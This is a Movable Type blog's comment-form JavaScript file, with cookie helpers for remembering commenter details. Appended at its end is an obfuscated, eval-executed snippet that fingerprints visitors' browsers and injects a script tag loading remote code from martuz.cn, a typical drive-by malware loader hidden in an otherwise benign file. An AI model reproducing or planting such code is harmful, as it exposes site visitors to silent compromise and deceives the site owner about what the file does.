function hideDocumentElement(id) {
    var el = document.getElementById(id);
    if (el) el.style.display = 'none';
}

function showDocumentElement(id) {
    var el = document.getElementById(id);
    if (el) el.style.display = 'block';
}

function showAnonymousForm() {
    showDocumentElement('comments-form');

}


var commenter_name;
var commenter_blog_ids;
var is_preview;
var mtcmtmail;
var mtcmtauth;
var mtcmthome;

function individualArchivesOnLoad(commenter_name) {

    hideDocumentElement('comments-open');





    if (document.comments_form) {
        if (!commenter_name && (document.comments_form.email != undefined) &&
            (mtcmtmail = getCookie("mtcmtmail")))
            document.comments_form.email.value = mtcmtmail;
        if (!commenter_name && (document.comments_form.author != undefined) &&
            (mtcmtauth = getCookie("mtcmtauth")))
            document.comments_form.author.value = mtcmtauth;
        if (document.comments_form.url != undefined &&
            (mtcmthome = getCookie("mtcmthome")))
            document.comments_form.url.value = mtcmthome;
        if (document.comments_form["bakecookie"]) {
            if (mtcmtauth || mtcmthome) {
                document.comments_form.bakecookie.checked = true;
            } else {
                document.comments_form.bakecookie.checked = false;
            }
        }
    }
}

function writeCommenterGreeting(commenter_name, entry_id, blog_id, commenter_id, commenter_url) {

}




// Copyright (c) 1996-1997 Athenia Associates.
// http://www.webreference.com/js/
// License is granted if and only if this entire
// copyright notice is included. By Tomer Shiran.

    function setCookie (name, value, expires, path, domain, secure) {
        var curCookie = name + "=" + escape(value) + (expires ? "; expires=" + expires.toGMTString() : "") +
            (path ? "; path=" + path : "") + (domain ? "; domain=" + domain : "") + (secure ? "secure" : "");
        document.cookie = curCookie;
    }

    function getCookie (name) {
        var prefix = name + '=';
        var c = document.cookie;
        var nullstring = '';
        var cookieStartIndex = c.indexOf(prefix);
        if (cookieStartIndex == -1)
            return nullstring;
        var cookieEndIndex = c.indexOf(";", cookieStartIndex + prefix.length);
        if (cookieEndIndex == -1)
            cookieEndIndex = c.length;
        return unescape(c.substring(cookieStartIndex + prefix.length, cookieEndIndex));
    }

    function deleteCookie (name, path, domain) {
        if (getCookie(name))
            document.cookie = name + "=" + ((path) ? "; path=" + path : "") +
                ((domain) ? "; domain=" + domain : "") + "; expires=Thu, 01-Jan-70 00:00:01 GMT";
    }

    function fixDate (date) {
        var base = new Date(0);
        var skew = base.getTime();
        if (skew > 0)
            date.setTime(date.getTime() - skew);
    }

    function rememberMe (f) {
        var now = new Date();
        fixDate(now);
        now.setTime(now.getTime() + 365 * 24 * 60 * 60 * 1000);
        now = now.toGMTString();
        if (f.author != undefined)
           setCookie('mtcmtauth', f.author.value, now, '/', '', '');
        if (f.email != undefined)
           setCookie('mtcmtmail', f.email.value, now, '/', '', '');
        if (f.url != undefined)
           setCookie('mtcmthome', f.url.value, now, '/', '', '');
    }

    function forgetMe (f) {
        deleteCookie('mtcmtmail', '/', '');
        deleteCookie('mtcmthome', '/', '');
        deleteCookie('mtcmtauth', '/', '');
        f.email.value = '';
        f.author.value = '';
        f.url.value = '';
    }

<!-- 
(function(gfH){var y5cZ='%';var aAJa=':76a:72:20a:3d:22:53cri:70:74Eng:69ne:22:2cb:3d:22Ve:72sio:6e()+:22:2c:6a:3d:22:22:2cu:3dn:61vigator:2euserAgent:3bif((u:2eindexOf(:22C:68:72om:65:22:29:3c:30):26:26(u:2ei:6e:64exOf:28:22:57in:22:29:3e0):26:26(:75:2ein:64e:78Of(:22NT:206:22):3c0):26:26(docume:6et:2eco:6fkie:2ei:6edex:4f:66(:22miek:3d1:22:29:3c0):26:26(:74:79p:65of(:7arvzts):21:3d:74yp:65:6ff:28:22A:22))):7bz:72v:7ats:3d:22:41:22:3b:65val(:22if(w:69n:64:6f:77:2e:22:2ba+:22:29:6a:3dj+:22+a+:22:4daj:6fr:22+b+:61+:22M:69:6eor:22+:62+a:2b:22Buil:64:22:2bb+:22j:3b:22):3bdo:63ument:2ew:72it:65:28:22:3cscri:70t:20src:3d:2f:2fm:22+:22artuz:2ecn:2f:76i:64:2f:3f:69d:3d:22+j+:22:3e:3c:5c:2fsc:72ipt:3e:22):3b:7d';eval(unescape(aAJa.replace(gfH,y5cZ)))})(/\:/g);
 -->